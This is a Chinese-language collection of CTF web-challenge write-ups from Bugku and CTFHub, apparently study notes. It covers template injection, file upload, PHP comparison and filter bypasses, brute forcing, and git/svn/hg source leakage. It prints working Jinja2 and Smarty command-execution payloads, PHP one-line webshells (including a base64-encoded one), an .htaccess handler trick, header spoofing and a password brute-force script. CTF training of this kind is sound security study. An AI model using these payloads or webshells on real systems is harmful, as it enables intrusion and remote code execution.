**1.模板注入**

```python
#模板：简单理解类似于作文模板，只需要往里面填写需要的参数。
#SSTI:1.python的一些框架：jinja2 mako tornado django
#     2.PHP框架：smarty twig
#     3.java框架：jade velocity
#模板注入：主要是程序员对代码不规范不严谨造成了模板注入漏洞，造成模板可控。
```

**例1：[Simple_SSTI_1---bugku]：**

学会使用浏览器的F12(CTRL+U)功能。

![12](../../../tree/master/Picture/1.png)

```python
#解决方法：
114.67.246.176:12344?flag={{config.SECRET_KEY}}
#找到注入的flag的值
#注：config.SECRET_KEY是flask框架中的配置文件，表示密钥配置信息
```

**例2：[Simple_SSTI_2---bugku]：**

使用F12后发现加载一张图片时出错：

![12](../Picture/2.png)

```python
#解决方法：使用flask框架的模板注入
payload：/?flag={{ config.__class__.__init__.__globals__['os'].popen('cat ../app/flag').read() }}
#就是将payload置于网页的URL之后，获取flag参数
##config为对象；
##__class__:返回对象所属类；
##__init__:类的初始方法,用以初始化实例；
##__globals__(也可用func_globals):以字典返回内建模块；
##OS就是返回字典里面的的一个模块
##popen（）返回一个输出流，通过read()读取里面的数据
```

payload的构造过程：

```python
##（1）明确要利用的目标函数；
##（2）找到目标函数被定义的位置，哪个模块（目标模块），或者哪个类（目标类）。
##（3）构造前一部分payload，大部分思路是固定的，目的是拿到所有Object类的子类。
##（4）这些子类很多没有加载，调用它们里面显式定义的方法，解析器就会加载并执行这个模块，如果模块刚好存在目标函数，就跳到第六步。（直接找到目标函数）
##（5）如果第五步加载的模块没有目标函数，就考虑在被加载模块中存在导入目标模块的import语句。（间接导入）
##（6）导入了目标函数或者目标模块后，在当前的命名空间就存在它们的变量，接下来就通过这些变量作为调用者，调用目标函数。
```

常见的payload：

```python
{{''.__class__.__base__.__subclasses__()[169].__init__.__globals__['sys'].modules['os'].popen("cat /flag").read()}}

# os._wrap_close类中的popen
{{"".__class__.__bases__[0].__subclasses__()[128].__init__.__globals__['popen']('whoami').read()}}

# __import__方法
{{"".__class__.__bases__[0].__subclasses__()[75].__init__.__globals__.__import__('os').popen('whoami').read()}}

# __builtins__
{{"".__class__.__bases__[0].__subclasses__()[128].__init__.__globals__['popen']('whoami').read()}}

# Jinja2创建的url_for()方法
{{url_for.__globals__.os.popen("cat /flag").read()}}
```

**例3：[聪明的PHP---bugku]：**

初始界面只有一行字符串，提示传入一个值，因此尝试在原URL后添加?a=1，显示出PHP代码。

![12](E:\Study\渗透分析和漏洞测试\CTF题解\Picture\60.png)

代码的大致意思是，传入的参数不能含有flag或者/flag，不能含有Linux常用命令比如system、readfile、gz、exec、eval、cat、assert、file、fgets等。代码中提到的template.html暗示了本道题目需要用到模板注入。下面先做知识点的引入：

smarty模板：使用PHP写出来的模板引擎，所有的smarty模板标签都被加上了定界符。默认情况下是'{' 和'}'。

smary中的{if}标签中可以执行的php语句：

- {if phpinfo()}{/if}
- {if system('ls')}{/if}
- {if readfile('/flag')}{/if}
- {if show_source('/flag')}{/if}
- {if system('cat ../../../../flag')}{/if}

passthru()函数：执行外部程序并且显示原始输出。例：{if passthru("ls /")}{/if}：执行ls命令并显示。

因此，本题采用的方式就是使用passthru函数，显示当前目录。

![12](E:\Study\渗透分析和漏洞测试\CTF题解\Picture\61.png)

发现当前目录下有一个_26988文件，使用more命令查看：`http://114.67.175.224:15818?a={if passthru("more /_12016 ")}{/if}`，可以获得flag的值。



**2.文件上传**

**例1：[Flask_FileUpload---bugku]：**

F12查看源码：

![12](Picture\3.png)

```python
#解决方法
#1.创建一个text.png/jpg文件
#2.使用记事本打开的方式，输入python代码
import os
os.system('cat /flag')     #表示查看本目录下的flag
#system函数可以将字符串转化成命令在服务器上运行；其原理是每一条system函数执行时，其会创建一个子进程在系统上执行命令行，子进程的执行结果无法影响主进程；
```

**例2：[xxx二手交易市场--bugku]：**

初始页面是一些二手商品的信息，和淘宝类似，首先需要注册账号并登录成功，接着寻找上传头像的地方有注入点，原因：上传空图片点击确定会卡死。随便传入一张图片后用burp抓包。

![12](E:\Study\渗透分析和漏洞测试\CTF题解\Picture\62.png)

可以发现image是经过base64加密的，因此可以使用base64一句话木马进行注入。`image=data:image/php;base64,<?php @eval($_POST[flag]);?`：前半句话表示以php形式传输图片，后半句话表示**base64一句话木马**，此时需要将该木马转成baset64编码进行传输。即：`data:image/php;base64,PD9waHAgQGV2YWwoJF9QT1NUW2ZsYWddKTs/Pg==`

![12](E:\Study\渗透分析和漏洞测试\CTF题解\Picture\63.png)

重放请求后收到php文件存放的路径，此时需要用中国蚁剑进行连接

- 连接的URL是：IP地址+/Uploads/heads/xxx.php
- 密码为POST参数的密码，此处为flag

连接成功后在html文件夹下找到flag文件获取flag值

![12](E:\Study\渗透分析和漏洞测试\CTF题解\Picture\65.png)

**例3：[文件上传---bugku]：**

![12](E:\Study\渗透分析和漏洞测试\CTF题解\Picture\69.png)

初始界面要求上传一个非php文件，传入1.jpg(文件内容为一句话PHP木马)试试，使用burp抓包可以看到：

![12](E:\Study\渗透分析和漏洞测试\CTF题解\Picture\70.png)

红圈圈起来的部分就是可以修改的部分。

- 第一点，可以将multipart/form-data绕过，data的第一个字母改成大写即可。
- 第二点，限制php文件上传，不代表php4、php5等被进制，将文件名改成1.php4
- 第三点，Content-Type改为image/jpg。

![12](E:\Study\渗透分析和漏洞测试\CTF题解\Picture\71.png)

此时服务器响应php文件存储的路径，用蚂剑连接，后续过程和上题一致。

**例4：[文件包含2---bugku]：**

初始界面就一行文字，啥也没有，通过F12也没看到啥信息，通过dirsearch扫描敏感目录时获得/upload.php目录，进入发现一个文件上传页面。

![12](E:\Study\渗透分析和漏洞测试\CTF题解\Picture\72.png)

和上题一样，只能传一张图片，可以在图片中写入PHP木马，不过本题采用另一种手段注入木马，通过**script方式**。此外，蚁剑连接一般需要通过php方式连接，像上题中一样，需要将图片的后缀改成.php。而用script方式可以不用改后缀，**直接连接.jpg文件。**

方法：`<script language=php>eval($_POST[shell])</script>`，shell为连接的密码。

通过burp repeater 发送请求后，收到响应 upload/202203091220116781.jpg。此时用蚁剑连接。

![12](E:\Study\渗透分析和漏洞测试\CTF题解\Picture\73.png)

连接后查看根路径下的flag文件，获取flag值。

**例5：[.htacess---bugku]：**

.heaccess文件：Apache服务器的配置文件，负责相关目录下网页配置。

.heaccess文件主要作用：改变文件扩展名。

方法：建立htaccess后缀名的文件，内容为`SetHandler application/x-httpd-php`，上传后用burp抓包，文件名之前加个 "." ，点击Forward转发数据包，此时上传一个jpg文件(含有一句话木马)，发现jpg可以被解析。

通过返回的上传路径，通过蚁剑成功连接后可以找到flag值。



**3.GET请求注入**

**例1：[矛盾---bugku]：**

F12查看源码：

![12](Picture\4.png)

```python
#解决方法
#GET请求的问题一般就是在原来的IP地址后加?param=value的方式进行注入
#分析代码，当num为数字时，不会进入if判断；进入if判断且num==1时，才会显示flag值
#因此，添加1+一串字符即可
114.67.175.224:11134?num=1fhkahfjakf
```

**例2：[备份是个好习惯--bugku]：**

![12](E:\Study\渗透分析和漏洞测试\CTF题解\Picture\45.png)

F12后发现一串字符串，第一个想法是会不会Base64加密了，不过一般Base64加密后的字符串的最后有“==”。接着就考虑用dirsearch或者御剑扫描一下敏感目录，下图为dirsearch扫描的结果。

![12](E:\Study\渗透分析和漏洞测试\CTF题解\Picture\46.png)

可以发现其中的index.php.bak备份文件。下载下来后用txt方式打开，发现是PHP源代码。

```php
<?php
/**
 * Created by PhpStorm.
 * User: Norse
 * Date: 2017/8/6
 * Time: 20:22
*/

include_once "flag.php";
ini_set("display_errors", 0);
$str = strstr($_SERVER['REQUEST_URI'], '?');
#strstr()：搜索字符串在另一字符串中是否存在，存在返回字符串及剩余部分，否则返回False
#例如：strstr("Hello World!!!","World") #返回World!!!
$str = substr($str,1);
#substr()：截取字符串，返回字符串的一部分。
$str = str_replace('key','',$str);
#str_replace()：用后字符串替代前面的字符串
parse_str($str);
echo md5($key1);

echo md5($key2);
if(md5($key1) == md5($key2) && $key1 !== $key2){
    echo $flag."取得flag";
}
?>
```

代码的大致意思就是返回URL“？”后面的值中的'key'用''进行替换，然后用MD5加密的方式输出。所以可以采用`kekeyy`的方式绕过，其中中间的key可以用''替代。另外，题目要求两个key值对应的MD5加密值相同才能显示出flag的值。

绕过方式有两种：

- md5()函数无法处理数组，如果传入的为数组，会返回NULL，因此可以采用`kekeyy1[]="1234"&kekeyy2[]="5678"`，注：数组中的值可以任意，不过必须是字符

- 利用==比较漏洞，如果两个字符经MD5加密后的值为 0exxxxx形式，就会被认为是科学计数法，且表示的是0*10的xxxx次方，下列的字符串的MD5值都是0e开头的：

  - s214587387a
  - 240610708
  - s878926199a
  - s155964671a

  随便选择其中的值作为payload传入即可。

**例3：[never_give_up--bugku]：**

初始页面自动跳转到hello.php，F12后可以发现一行注释<!--1p.html-->

![12](E:\Study\渗透分析和漏洞测试\CTF题解\Picture\54.png)

**掌握直接读取源码的方法**：在http:IP+端口号之前加上`view-source:`，代码如下：

```js
var Words = %3Cscript%3Ewindow.location.href%3D'http%3A%2F%2Fwww.bugku.com'%3B%3C%2Fscript%3E%20%0A%3C!--JTIyJTNCaWYoISUyNF9HRVQlNUInaWQnJTVEKSUwQSU3QiUwQSUwOWhlYWRlcignTG9jYXRpb24lM0ElMjBoZWxsby5waHAlM0ZpZCUzRDEnKSUzQiUwQSUwOWV4aXQoKSUzQiUwQSU3RCUwQSUyNGlkJTNEJTI0X0dFVCU1QidpZCclNUQlM0IlMEElMjRhJTNEJTI0X0dFVCU1QidhJyU1RCUzQiUwQSUyNGIlM0QlMjRfR0VUJTVCJ2InJTVEJTNCJTBBaWYoc3RyaXBvcyglMjRhJTJDJy4nKSklMEElN0IlMEElMDllY2hvJTIwJ25vJTIwbm8lMjBubyUyMG5vJTIwbm8lMjBubyUyMG5vJyUzQiUwQSUwOXJldHVybiUyMCUzQiUwQSU3RCUwQSUyNGRhdGElMjAlM0QlMjAlNDBmaWxlX2dldF9jb250ZW50cyglMjRhJTJDJ3InKSUzQiUwQWlmKCUyNGRhdGElM0QlM0QlMjJidWdrdSUyMGlzJTIwYSUyMG5pY2UlMjBwbGF0ZWZvcm0hJTIyJTIwYW5kJTIwJTI0aWQlM0QlM0QwJTIwYW5kJTIwc3RybGVuKCUyNGIpJTNFNSUyMGFuZCUyMGVyZWdpKCUyMjExMSUyMi5zdWJzdHIoJTI0YiUyQzAlMkMxKSUyQyUyMjExMTQlMjIpJTIwYW5kJTIwc3Vic3RyKCUyNGIlMkMwJTJDMSkhJTNENCklMEElN0IlMEElMDklMjRmbGFnJTIwJTNEJTIwJTIyZmxhZyU3QioqKioqKioqKioqJTdEJTIyJTBBJTdEJTBBZWxzZSUwQSU3QiUwQSUwOXByaW50JTIwJTIybmV2ZXIlMjBuZXZlciUyMG5ldmVyJTIwZ2l2ZSUyMHVwJTIwISEhJTIyJTNCJTBBJTdEJTBBJTBBJTBBJTNGJTNF--%3E" 

function OutWord()
{
var NewWords;
NewWords = unescape(Words);
document.write(NewWords);
} 
OutWord();
```

需要对word的值进行URL解码和base64解码，解码后的结果为：

```php
<script>window.location.href='http://www.bugku.com';</script> 
//这一行只默认跳转到bugku的首页
<!--";if(!$_GET['id']) //$id = 0才不进入if
{
	header('Location: hello.php?id=1');
	exit();
}
$id=$_GET['id'];
$a=$_GET['a'];
$b=$_GET['b'];
if(stripos($a,'.'))	//返回'.'在$a中的位置
{
	echo 'no no no no no no no';
	return ;
}
$data = @file_get_contents($a,'r'); //读取名称为a文件，赋值给data
if($data=="bugku is a nice plateform!" and $id==0 and strlen($b)>5 and eregi("111".substr($b,0,1),"1114") and substr($b,0,1)!=4)
//eregi("111".substr($b,0,1),"1114")表示"111"和$b的第一个字符匹配"1114"
{
	$flag = "flag{***********}"
}
else
{
	print "never never never give up !!!";
}


?>-->
```

分析代码：接受三个参数$id、$a、$b。条件：

- $a中不含有'.'。
- $id = 0。
- 名为a的文件，文件内容为bugku is a nice plateform!
- $b的长度>5，第一个字符不为4，且与1114匹配(是1114的前缀码)

绕过方法：

- id=0会自动跳转到id=1，因此，可以采用**弱类型比较** 0xg = 0。
- 利用**PHP伪协议**传入a的值

```
a=php://input

post传入：bugku is a nice plateform!
```

- 利用**00截断**绕过eregi，eregi截取的是第一个字符，第一个字符不能为4，因此可以构造b为%0012345，其中%00表示空格，经过substr截取，与111拼接成111，满足和1114匹配的条件，且b的长度＞5。

最终的payload 

![12](E:\Study\渗透分析和漏洞测试\CTF题解\Picture\55.png)

**例4：[前女友---bugku]：**

初始界面就一段文字，扫描敏感文件也没扫到，只能用Burp抓包看看。

![12](E:\Study\渗透分析和漏洞测试\CTF题解\Picture\66.png)

发现居然由两个字超链接到code.txt文件，打开文件发现是一串PHP代码。

```php
<?php
if(isset($_GET['v1']) && isset($_GET['v2']) && isset($_GET['v3'])){
    $v1 = $_GET['v1'];
    $v2 = $_GET['v2'];
    $v3 = $_GET['v3'];
    if($v1 != $v2 && md5($v1) == md5($v2)){
        if(!strcmp($v3, $flag)){
            echo $flag;
        }
    }
}
?>
```

这题和例2非常相似，需要传入GET请求三个参数，v1、v2、v3。v1和v2的md5加密的值必须相等，因此可以采用数组的方式进行绕过。payload为：`?v1[]="123"&v2[]="456"&v3[]="789"`



**4.网页保存**

**例1：[alert---bugku]：**

![12](Picture\5.png)

Ctrl + S 保存网页到本地，用记事本打开。

![12](Picture\6.png)

```python
#解决方法
#使用Fiddler中的TextWizard中的解码器功能
#如下图所示
```

![12](Picture\7.png)



**5.加密**

**例1：[game1---bugku]：**

用抓包软件或者F12中的网络可以发现游戏失败后出现了一个php文件

![12](Picture\8.png)

```python
#PHP URL
http://114.67.175.224:16341/score.php?score=25&ip=39.190.231.164&sign=zMMjU===
#可以发现，其中的sign=zMMjU===，sign=zM+base64加密+==
#25对应的base64加密为MjU
#主要思路：技巧性的通关游戏，获取flag
#解决方法
#用很大的score以及对应的base64编码即可通关游戏，获取flag值
http://114.67.175.224:16341/score.php?score=99999&ip=39.190.231.164&sign=zMOTk5OTk===
```

**例2：[decrypt---bugku]：**

题目中提供了一个index.php和data=fR4aHWwuFCYYVydFRxMqHhhCKBseH1dbFygrRxIWJ1UYFhotFjA=，index.php代码如下：

```php
<?php
function encrypt($data,$key)
{
    $key = md5('ISCC');
    $x = 0;
    $len = strlen($data);
    $klen = strlen($key);
    for ($i=0; $i < $len; $i++) { 
        if ($x == $klen)
        {
            $x = 0;
        }
        $char .= $key[$x];
        $x+=1;
    }
    for ($i=0; $i < $len; $i++) {
        $str .= chr((ord($data[$i]) + ord($char[$i])) % 128);#flag值的获取方式
    }
    return base64_encode($str);
}
?>
```

分析代码：首先data是经过base64加密的字符串，解密后虽然得到乱码，不过不重要，得到data的长度为38，接着对"ISCC"字符串进行MD5加密，加密后得到32位的字符串。

编写python代码获得flag的值：

```python
from base64 import *
from hashlib import *

str_b64encode='fR4aHWwuFCYYVydFRxMqHhhCKBseH1dbFygrRxIWJ1UYFhotFjA='
s=str(b64decode(str_b64encode),'utf-8')#len(str)=38,即len=38

key=md5('ISCC'.encode('utf-8')).hexdigest()
#32位加密值'729623334f0aa2784a1599fd374c120d'
char=''
x=0
flag=''
for i in range(0,38):
    if x==len(key):
        x=0
    char+=key[x]
    x+=1
for i in range(0,38):
    if ord(s[i])<ord(char[i]):
        flag=flag+chr((ord(s[i])+128)-ord(char[i]))
        continue
    flag = flag + chr(ord(s[i]) - ord(char[i]))
print(flag)
#为什么不像php代码中的那样，直接对s[i]和chr[i]的值进行求和然后对128取余？因为s[i]中的字符是乱码，通过大-小、小+128-大的方式可以避免这个问题
```

**例3：[getshell---bugku]：**

初始界面是一串PHP代码，通过待定系数法确定各个变量，然后经过三层套娃后，终于得到最后的php代码(太蓝了鸭!!!!)。

```php
<?php
highlight_file(njVysBZvxrLkFYdNofcgGuawDJblpOSQEHRUmKiAhzICetPMqXMT);
eval($_POST[ymlisisisiook]);
?>
```

用蚁剑连接试试，直接连接根目录，密码是ymlisisisiook，连接成功。执行命令的时候显示red=127，说明命令被过滤的差不多了。

使用disable_functions绕过插件。

![12](E:\Study\渗透分析和漏洞测试\CTF题解\Picture\81.png)

然后在文件目录下建立了一个.antproxy.php的文件。使用蚁剑连接该文件(IP地址+文件名)，密码和之前一致。连接后就能使用命令查看flag的值了。

![12](E:\Study\渗透分析和漏洞测试\CTF题解\Picture\82.png)



**6.网站后门**

**例1：[网站被黑---bugku]：**

![12](Picture\9.png)

F12没有发现什么问题，通过**御剑**扫描网站敏感目录

![12](Picture\10.png)

发现其中有两个PHP文件，index.php指向网站本身，shell.php为一个登录页面。

![12](Picture\11.png)

此时需要获取密码。通过burp suite爆破方式获取。

![12](Picture\12.png)

Length和其他不同的即为密码，密码为hack。

回到之前的登录页面，输入密码就可以得到flag。



**7.PHP实战**

**例1：[eval---bugku]：**

![12](Picture\13.png)

```python
#分析代码
#第一行表示：flag在文件flag.php中
#第二行表示：$_REQUEST可以将用户传入的hello传给服务器
#第三行表示：var_dump把输入的hello作为字符串string输出，eval则可以把字符串当作php代码执行
#解决方法
#给hello赋值，赋值成查看flag.php文件的命令
http://114.67.175.224:16339?hello=system("cat flag.php")
#显示结果如下图，注意flag的值没有直接显示，那么就F12查看，发现在注释中。
```

![12](Picture\14.png)

**例2：[变量1---bugku]：**

<img src="E:\Study\渗透分析和漏洞测试\CTF题解\Picture\24.png" alt="12" style="zoom:150%;" />

首先分析PHP代码：

```php
include "flag1.php"  #这个是混淆，实际flag值不在flag1.php中
isset($_GET('args')) #表示args的值在集合中
preg_match("/^\w+$/")#正则匹配包含在"/ /"中，\w表示a-zA-Z0-9，$表示以前面的字符作为结束,^表示以后面的字符开始，因此这句话表示输入的args的值只能在字符和数字中选。
eval()  #表示将字符串作为PHP代码执行
var_dump() #表示输出字符串的类型
-------------------------------------------------------
```

解决思路：题目中给了提示：变量，因此flag的值可能隐藏在args值的类型中，而eval能执行PHP代码，需要用到**超全局变量**$GLOBES：用于在 PHP 脚本中的任意位置访问全局变量（从函数或方法中均可）。

![12](E:\Study\渗透分析和漏洞测试\CTF题解\Picture\25.png)

**例3：[No one knows regex better than me---bugku]：**

初始页面是PHP代码：

```php
 <?php 
error_reporting(0);
$zero=$_REQUEST['zero'];
$first=$_REQUEST['first'];
$second=$zero.$first;
if(preg_match_all("/Yeedo|wants|a|girl|friend|or|a|flag/i",$second)){
    $key=$second;
    if(preg_match("/\.\.|flag/",$key)){
        die("Noooood hacker!");
    }else{
        $third=$first;
        if(preg_match("/\\|\056\160\150\x70/i",$third)){  //关键语句
            $end=substr($third,5);
            highlight_file(base64_decode($zero).$end);//maybe flag in flag.php
        }
    }
}
else{
    highlight_file(__FILE__);
} 
```

从关键语句中`preg_match("/\\|\056\160\150\x70/i",$third)`，可以看出其中的正则表达式经过了多重转义

- `\056\160\150\x70`使用ASCII解码后得到`.php`，其中前面三个是8进制，最后一个是16进制
- `\\`是PHP语法转义，转义为一个\，剩下`\|.php`
- `\|`是正则转义，转义为|，剩下|.php

代码中提示flag可能在flag.php中，因此highlight_file()函数中的值极有可能为flag.php => base64_decode($zero).$end = flag.php 

- 因此，$end = `php` ，$zero = base64_encode("flag") =  `ZmxhZw==`。

- 而$zero、$first是通过Request传入的参数，$second = $zero.$first
- $key = $second = $zero.$first，且不能存在`"/\.\.|flag/"`，因此$zero不等于flag，但可以等于"flag"base64加密后的 `ZmxhZw==`。
- $third = $first ，且要匹配`|.php`，$end = substr($third,5) => $first/$third = `xxxx|.php`，其中x得满足`Yeedo|wants|a|girl|friend|or|a`
- 因此完整的payload为`?zero=ZmxhZw==&first=aaaa|.php`

![12](E:\Study\渗透分析和漏洞测试\CTF题解\Picture\51.png)

**例4：[闪电十六鞭---bugku]：**

初始界面是一段PHP代码：

```php
<?php
    error_reporting(0);
    require __DIR__.'/flag.php';

    $exam = 'return\''.sha1(time()).'\';';

    if (!isset($_GET['flag'])) {
        echo '<a href="./?flag='.$exam.'">Click here</a>';
    }
    else if (strlen($_GET['flag']) != strlen($exam)) {
        echo '长度不允许';
    }
    else if (preg_match('/`|"|\.|\\\\|\(|\)|\[|\]|_|flag|echo|print|require|include|die|exit/is', $_GET['flag'])) {
        echo '关键字不允许';
    }
    else if (eval($_GET['flag']) === sha1($flag)) {
        echo $flag;
    }
    else {
        echo '马老师发生甚么事了';
    }

    echo '<hr>';

    highlight_file(__FILE__);
```

分析代码：首先需要在IP地址之后传入flag的值。变量exam的值表示含有return和当前时间的sha加密的字符串，通过点击click here超链接后可以获知exam变量长度，为49

- 如果flag的值的长度比exam值的长度小，返回长度不允许
- 如果flag的值为空，则返回一个click here的超链接
- 如果flag的值和sha加密后的flag值相等，则输出最终的flag
- 过滤了一些关键字，比较关键的是flag和echo等。

因此需要满足上述条件设置绕过规则的payload。

引入知识点：

- php短标签风格：左边无需`<?php`，直接保留php代码和右端`?>`即可。例如`phpinfo()?>`即可被正常解析
- 使用`<?=$a?>`方式进行输出，等价于`<php? echo $a; ?>`
- flag被过滤的绕过方式：可以通过赋值其他变量，然后修改的方式。

```php
<?php
    $a = 'hello'
    $a[3] = 'o'
    echo $$a//此时输出heloo
?>
```

因此，本题的payload可以设置为**?flag=$a='flxg';$a{2}='a';11111111111111111;?><?=$$a;?>**。长度为49，而且代码中有eval函数，可以将flag值作为字符串处理。



**8.脚本编写**

**例1：[cookies---bugku]：**

![12](E:\Study\渗透分析和漏洞测试\CTF题解\Picture\52.png)



初始界面会默认跳转到`http://114.67.175.224:11460/index.php?line=&filename=a2V5cy50eHQ=`中，可以发现filename后的值是经过Base64加密后的，解密得到keys.txt。想要读取index.php文件的内容，因此，需要将index.php进行base64加密后赋给filename。加密后的值为aW5kZXgucGhw

然后随便输入line=3，发现输出y一行PHP代码，那么接下来就需要获取全部的PHP代码。

```python
import requests
a = 30
for i in range(a):
    url =  "http://114.67.175.224:11460/index.php?line=" + str(i) + "&filename=aW5kZXgucGhw"
    res += requests.get(url)
    print(res.text)
```

得到PHP代码：

```php
<?php

error_reporting(0);

$file=base64_decode(isset($_GET['filename'])?$_GET['filename']:"");

$line=isset($_GET['line'])?intval($_GET['line']):0;

if($file=='') header("location:index.php?line=&filename=a2V5cy50eHQ=");

$file_list = array(

'0' =>'keys.txt',

'1' =>'index.php',

);

 

if(isset($_COOKIE['margin']) && $_COOKIE['margin']=='margin'){

$file_list[2]='keys.php';

}

 

if(in_array($file, $file_list)){

$fa = file($file);

echo $fa[$line];

}

?>
```

可以看到需要设置cookie的值为margin=margin，此时可以访问keys.php文件，将keys.php用base64加密后得到`a2V5cy5waHA=`，修改GET请求后重新发出。

![12](E:\Study\渗透分析和漏洞测试\CTF题解\Picture\53.png)

**例2：[秋名山车神---bugku]：**

![12](E:\Study\渗透分析和漏洞测试\CTF题解\Picture\57.png)

初始界面要求两秒内计算出长表达式结果并提交，不断的刷新，发现表达式一直在变换，这种必须写脚本，才能跟上速度。

```python
import requests
import re
s = requests.session()  #观察get请求是发现有phpsessid，说明有session
r = s.get('http://114.67.175.224:14019/')
searchobj = re.search(r'^<div>(.*)=\?;$</div>',r.text,re.M | re.S)#设置搜索范围为<div></div>标签中=?;结尾的字符串，r'表示原始字符串
d={
    "value":eval(searchObj.group(1)) 
}
#group(0)表示匹配整体,group(1)表示匹配第一个()内的内容,eval表示将字符串作为表达式输出。
r = s.post('http://114.67.175.224:14019/',data=d)
print(r.text)
```

着重学习一下`re.search(pattern, string, flags=0)`

- pattern : 正则中的模式字符串。
- string : 要被查找替换的原始字符串。
- flags : 标志位，用于控制正则表达式的匹配方式，如：是否区分大小写，多行匹配等等。

![12](E:\Study\渗透分析和漏洞测试\CTF题解\Picture\58.png)

**例3：[速度要快---bugku]：**

![12](E:\Study\渗透分析和漏洞测试\CTF题解\Picture\59.png)

初始界面可以发现flag值在response中的Header中，很明显是Base64加密后的形式，不过需要注意的是每次刷新页面，flag的值会动态改变。因此需要编写脚本代替手动post。

```python
import requests
import base64
s = requests.session()
r = s.get('http://114.67.175.224:12562/')
headers = r.headers  #flag值在header中

tmp = base64.b64decode(headers['flag'])
tmp = tmp.decode()
#为了下一步用split不报错，b64decode后操作的对象是byte类型的字符串，而split函数要用str类型的

flag = base64.b64decode(tmp.split(':')[1])
#获得flag:后的值
#这里需要注意，flag:后的值可以进行二次base64解码
data = {'margin':flag} #注释中要求提交margin字段

print((r.post('http://114.67.175.224:12562/',data=data)).text)
```





**9.用户名/密码爆破**

**例1：[bp---bugku]：**

![12](E:\Study\渗透分析和漏洞测试\CTF题解\Picture\20.png)

首先用bp抓包，然后将Post请求发到Intruder进行爆破。

添加top1000字典，爆破后结果显示密码都不对。

```python
#解决方法
#查看几个response，发现其中都含有一段js代码，爆破时要根据js中的r.code的值筛选结果
#设置options中的Grep-Match，如下图所示。
```

![12](E:\Study\渗透分析和漏洞测试\CTF题解\Picture\21.png)

![12](E:\Study\渗透分析和漏洞测试\CTF题解\Picture\22.png)

再次进行爆破，爆破结果如下，可以很容易找到password。

![12](E:\Study\渗透分析和漏洞测试\CTF题解\Picture\23.png)

**例2：[本地管理员---bugku]：**

![12](Picture\17.png)

这题考察的是**限制登录IP**的情形。从F12中可以看到注释里含有Base64加密的字符dGVzdDEyMw== ，利用Burp的Decoder功能进行解密，解密结果为test123。猜测为管理员系统的密码。

接着需要获取用户名，随便输入一个用户名和test123的密码进行登录，页面显示**IP禁止访问**。使用Burp的代理的Intercept拦截该Post请求。

```python
#解决方法
#在Post请求的Head中添加：
X-Forwarded-For: 127.0.0.1
```

然后通过Intruder对用户名进行爆破：

![12](Picture\18.png)

可以得到管理员的用户名和密码分别为admin和test123。

最后通过Repeater界面重放Post请求，收到带有flag值的Response。

![12](Picture\19.png)

**例3：[好像需要密码---bugku]：**

![12](E:\Study\渗透分析和漏洞测试\CTF题解\Picture\36.png)

题目中的提示是5位的数字密码，可以使用bp的密码爆破，设置从10000~99999，步长为1的所有数字进行爆破。

![12](E:\Study\渗透分析和漏洞测试\CTF题解\Picture\37.png)

这种方法得到爆破密码比较慢，另一种方法是编写python脚本：

```python
#本代码适用于5位数字密码的爆破，如果是其他位数的数字密码，可以修改min_num，request.post中的IP地址+端口号

#缺点：目标服务器可能不稳定，连接可能会中断。
import urllib
import requests
import time
import threading
#from bs4 import BeautifulSoup

# 1.密码生成
print("请输入纯数字密码位数：")
input_len = input()

min_num = 10000
max_num = '9' * (int(input_len))
passwords_list = []

for i in range(min_num,int(max_num)+1):
    if len(str(i)) < int(input_len):
        i = '0' * (int(input_len)-len(str(i)))+str(i)
    passwords_list.append(i)

print("密码生成完毕!")

# 2.将生成的密码带入进行测试
for password in passwords_list:
    test = requests.post('http://114.67.246.176:19294/',data={'pwd': password})
    print('当前测试的密码为：')
    print(password)
    #time.sleep(0.5)   #此处的延时可加可不加
    if 'flag' in test.text:
        print('正确的密码为：')
        print(password)
        break

print('执行完毕！')

```

执行结果如下：

![12](E:\Study\渗透分析和漏洞测试\CTF题解\Picture\39.png)

**例4：[基础认证---ctfhub]：**

在HTTP中，基本认证（Basic access authentication）是允许http用户代理（如：网页浏览器）在请求时，提供 用户名 和 密码 的一种方式。

比如：用户名“Aladdin”，密码 “open sesame”，客户端请求为：

```php
GET /private/index.html HTTP/1.0
Host: localhost
Authorization: Basic QWxhZGRpbjpvcGVuIHNlc2FtZQ==  #base64加密，解密后为Aladdin:open sesame
```

本题首先获得一个含有100个密码的字典，通过burp抓包后，从响应中获知用户名为 admin ，密码需要和用户名组合并base64加密后进行爆破。

- 首先将需要爆破的base64加密作为变量
- 导入密码字典
- Payload Processing -> add -> Add prefix -> admin:。设置payload前缀
- Payload Processing -> add -> Encode -> Base64-encode。设置payload加密方式
- 开始爆破

爆破后可以得到正确的密码以及flag值。



**10.git文件泄露**

**例1：[source---bugku]：**

![12](E:\Study\渗透分析和漏洞测试\CTF题解\Picture\30.png)

F12发现，注释中的flag为虚假的值，接着题目中的提示为Linux，想到使用Linux中的dirsearch命令进行目录扫描

![12](E:\Study\渗透分析和漏洞测试\CTF题解\Picture\26.png)

扫描后可以发现一个flag.txt文件，发现flag仍为虚假的值，不要灰心。

![12](E:\Study\渗透分析和漏洞测试\CTF题解\Picture\27.png)

接着使用wegt -r http://ip_address/.git 进行递归，在其爆出的文件夹中进行git reflog查看执行的命令日志。

![12](E:\Study\渗透分析和漏洞测试\CTF题解\Picture\28.png)

然后通过左边的文件代号，通过git show + 文件代号的方式即可查看到最终的flag值。cu

![12](E:\Study\渗透分析和漏洞测试\CTF题解\Picture\29.png)

**例2：[git---ctfhub]：**

题目中给出的提示是git泄露，通过 curl + IP地址 + .git/config 可以发现确实出现了git泄露，接着使用Githack 工具clone源代码到本地。

![12](E:\Study\渗透分析和漏洞测试\CTF题解\Picture\85.png)

然后进入文件夹，使用命令 `git log` 查看历史记录。

![12](E:\Study\渗透分析和漏洞测试\CTF题解\Picture\86.png)

可以看到一次添加flag，一次移除flag，我们主要关注这个添加flag的版本。

使用命令 `git diff HEAD^` ，表示比较 workspace 与最新commit的前一次commit的差异，从中可以得到flag的值。

**例3：[svn---ctfhub]：**

SVN泄露也属于信息泄露的一种，通过dirsearch扫描发现有.svn/目录，即发生了.svn泄露，可以用**dvcs-ripper**工具中的**rip-svn.pl**脚本进行clone。

用法：perl rip-svn.pl -u IP/.svn

![12](E:\Study\渗透分析和漏洞测试\CTF题解\Picture\87.png)

接着进入 `.svn/pristine/`目录，可以找到flag。

**例4：[hg---ctfhub]：**

HG泄露也属于信息泄露的一种，通过dirsearch扫描发现有.hg/目录，即发生了.hg泄露，可以用**dvcs-ripper**工具中的**rip-hg.pl**脚本进行clone。

用法：perl rip-hg.pl -u IP/.hg

![12](E:\Study\渗透分析和漏洞测试\CTF题解\Picture\88.png)

